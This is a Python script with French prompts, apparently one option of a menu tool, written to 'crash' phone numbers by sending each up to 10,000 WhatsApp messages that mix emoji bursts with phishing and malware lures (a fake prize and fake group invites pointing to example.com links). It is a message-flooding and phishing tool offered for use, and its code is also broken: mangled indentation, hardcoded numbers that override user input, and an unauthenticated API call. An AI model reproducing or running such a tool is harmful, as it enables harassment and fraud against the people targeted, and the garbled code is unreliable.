from colorama import Fore

def run():
    print(Fore.GREEN + "\n[ OPTION 2 ACTIVÉE ]")

    import requests
import time
import random

def crash_phone_numbers(phone_numbers):
    url = f"https://api.whatsapp.com/v1/messages"
    headers = {
        "Content-Type": "application/json"
    }
    payloads = [
        "😱👀💥👺💣🔥💀👻💔😲",
        "Rejoignez notre groupe admin : https://example.com/malware",
        "Vous avez gagné un prix ! Cliquez ici pour réclamer : https://example.com/phishing",
        "🚀👽💻🔥💸😈👺",
        " Vous êtes invité à rejoindre notre groupe secret : https://example.com/malware"
    ]
    phone_numbers_string = "+123456789, +987654321, +5551234567".replace(", ", "+")
    phone_numbers_list = phone_numbers_string.split("+")
    for phone_number in phone_numbers_list:
        phone_number = phone_number.strip()
        for i in range(10000):
            payload = random.choice(payloads)
            data = {
                "to": phone_number,
                "body": {
                    "text": payload + " " + str(i)
                }
            }
            response = requests.post(url, headers=headers, json=data)
            if response.status_code == 200:
                print(f"Message envoyé à {phone_number} avec succès")
            else:
                print(f"Erreur lors de l'envoi du message à {phone_number}")
            delay = random.uniform(0.1, 1.0)  # Délai aléatoire entre 0.1 et 1 seconde
            time.sleep(delay)

def main():
    phone_numbers_string = input("Entrez les numéros de téléphone à crasher (séparés par des virgules sans virgules) : ")
    phone_numbers_string = phone_numbers_string.replace(", ", "+")
    phone_numbers_list = phone_numbers_string.split("+")
    crash_phone_numbers(phone_numbers_list)

if __name__ == "__main__":
    main()



    input("\nAppuie sur Entrée pour retour...")
